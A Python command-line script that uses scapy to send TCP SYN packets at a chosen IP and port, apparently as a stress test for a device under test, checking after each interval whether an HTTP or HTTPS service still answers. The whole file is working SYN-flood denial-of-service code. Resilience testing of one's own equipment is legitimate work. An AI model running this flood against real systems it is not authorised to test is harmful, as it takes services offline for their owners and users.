#!/usr/bin/python3
import click
import ipaddress
from scapy.all import *
from tqdm import tqdm
from time import sleep
import requests


def validation_http_get_base(target_ip, target_port, ipv6, method):
    res = False
    try:
        t = target_ip
        if ipv6:
            t = f"[{target_ip}]"
        r = requests.get(f"{method}://{t}:{target_port}", timeout=5)
        res = True
    except:
        pass
    finally:
        return res

def validation_http_get(target_ip, target_port, ipv6):
    return validation_http_get_base(target_ip, target_port, ipv6, method="http")

def validation_https_get(target_ip, target_port, ipv6):
    return validation_http_get_base(target_ip, target_port, ipv6, method="https")

def validation_none(target_ip, target_port, ipv6):
    return True


@click.command()
@click.option("--target-ip", prompt="Target IP", help="The ipv4/ipv6 address of the device under test", required=True)
@click.option("--target-port", default=80, prompt="Target port", help="The TCP port to target")
@click.option("--max-connections", default=1000, help="Max open TCP connections to device")
@click.option("--interval", default=100, help="Interval between new connections in ms")
@click.option("--validation-method", default="HTTP_GET", help="validation method to validate the service still works (Options: HTTP_GET, HTTPS_GET, none)")
@click.option("--validation-interval", default=1, help="interval between validation checks")
def synFloodController(target_ip, target_port, max_connections, interval, validation_method, validation_interval):
    # Validate target ip
    ipv6 = True
    try:
        if "." in target_ip:
            ipaddress.IPv4Address(target_ip)
            ipv6 = False
        else:
            ipaddress.IPv6Address(target_ip)
            ipv6 = True
    except:
        print("Provided target ip is not a valid ipv4 or ipv6 address")
        exit(1)
    
    # Validate target port
    try:
        target_port_int = int(target_port)
        if target_port_int > 2**16-1:
            raise ValueError()
    except:
        print("Provided target port is not a valid tcp port number")
        exit(1)
    
    validation_selector = {
        "HTTP_GET": validation_http_get,
        "HTTPS_GET": validation_https_get,
        "none": validation_none
    }

    # Validate validation method
    if validation_method not in validation_selector.keys():
        print("Please choose a valid validation method")
        exit(1)
    
    
    if ipv6:
        ip = IPv6(dst=target_ip)
    else:
        ip = IP(dst=target_ip)
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
    raw = Raw(b"X"*64)
    packet = ip / tcp / raw

    verify_counter = 0
    
    for i in tqdm(range(max_connections)):
        send(packet, verbose=0)
        sleep(interval/1000)
        verify_counter += 1

        if verify_counter == validation_interval:
            verify_counter = 0
            r = validation_selector[validation_method](target_ip=target_ip, target_port=target_port, ipv6=ipv6)
            if not r:
                print(f"Application under test failed after creating {i} connections")
                exit(0)
    print("Application under test completed the test successfully, consider increasing max connections, or decreasing interval")




if __name__ == '__main__':
    synFloodController()